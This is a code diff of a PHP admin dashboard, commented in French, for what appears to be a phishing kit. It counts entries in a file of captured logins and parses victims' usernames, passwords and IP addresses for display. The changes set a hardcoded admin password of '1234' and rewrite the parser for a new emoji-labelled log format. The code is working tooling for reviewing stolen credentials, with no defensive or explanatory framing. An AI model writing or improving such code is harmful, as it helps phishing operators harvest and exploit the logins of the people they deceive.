@@ -4,7 +4,7 @@
 
 // Paramètres de connexion (à changer en production)
 $username = "admin";
-$password = "securitydemo2023";
+$password = "1234";
 
 // Vérifier si l'utilisateur est connecté
 session_start();
@@ -42,11 +42,11 @@ if ($loggedIn) {
         $visits = count($ipLines);
     }
     
-    // Nombre de tentatives de connexion
+    // Nombre de tentatives de connexion (nouveau format)
     $logins = 0;
     if (file_exists('info_phishing.txt')) {
         $content = file_get_contents('info_phishing.txt');
-        preg_match_all('/=== IDENTIFIANTS CAPTURÉS LE/', $content, $matches);
+        preg_match_all('/========= Connexion détectée =========/', $content, $matches);
         $logins = count($matches[0]);
     }
     
@@ -69,43 +69,28 @@ function getPhishingEntries($limit = 10) {
     }
     
     $content = file_get_contents('info_phishing.txt');
-    $blocks = explode('=== IDENTIFIANTS CAPTURÉS', $content);
+    $lines = explode("\n", $content);
     
-    // Supprimer le premier élément vide
-    array_shift($blocks);
+    $currentEntry = [];
+    foreach ($lines as $line) {
+        if (strpos($line, '========= Connexion détectée =========') !== false) {
+            if (!empty($currentEntry)) {
+                $entries[] = $currentEntry;
+            }
+            $currentEntry = [];
+        } elseif (strpos($line, '🕒 Date') !== false) {
+            $currentEntry['date'] = trim(str_replace('🕒 Date        :', '', $line));
+        } elseif (strpos($line, '👤 Identifiant') !== false) {
+            $currentEntry['username'] = trim(str_replace('👤 Identifiant :', '', $line));
+        } elseif (strpos($line, '🔐 Mot de passe') !== false) {
+            $currentEntry['password'] = trim(str_replace('🔐 Mot de passe:', '', $line));
+        } elseif (strpos($line, '🌍 IP') !== false) {
+            $currentEntry['ip'] = trim(str_replace('🌍 IP          :', '', $line));
+        }
+    }
     
-    // Traiter chaque bloc d'information
-    foreach ($blocks as $block) {
-        $entry = [];
-        
-        // Extraire la date
-        if (preg_match('/LE (.*?) ===/', $block, $dateMatch)) {
-            $entry['date'] = trim($dateMatch[1]);
-        }
-        
-        // Extraire le nom d'utilisateur
-        if (preg_match('/Nom d\'utilisateur: (.*?)[\r\n]/', $block, $usernameMatch)) {
-            $entry['username'] = trim($usernameMatch[1]);
-        }
-        
-        // Extraire le mot de passe
-        if (preg_match('/Mot de passe: (.*?)[\r\n]/', $block, $passwordMatch)) {
-            $entry['password'] = trim($passwordMatch[1]);
-        }
-        
-        // Extraire l'IP
-        if (preg_match('/Adresse IP: (.*?)[\r\n]/', $block, $ipMatch)) {
-            $entry['ip'] = trim($ipMatch[1]);
-        }
-        
-        // Extraire le User-Agent
-        if (preg_match('/User-Agent: (.*?)[\r\n]/', $block, $uaMatch)) {
-            $entry['user_agent'] = trim($uaMatch[1]);
-        }
-        
-        if (!empty($entry)) {
-            $entries[] = $entry;
-        }
+    if (!empty($currentEntry)) {
+        $entries[] = $currentEntry;
     }
     
     // Prendre les dernières entrées selon la limite
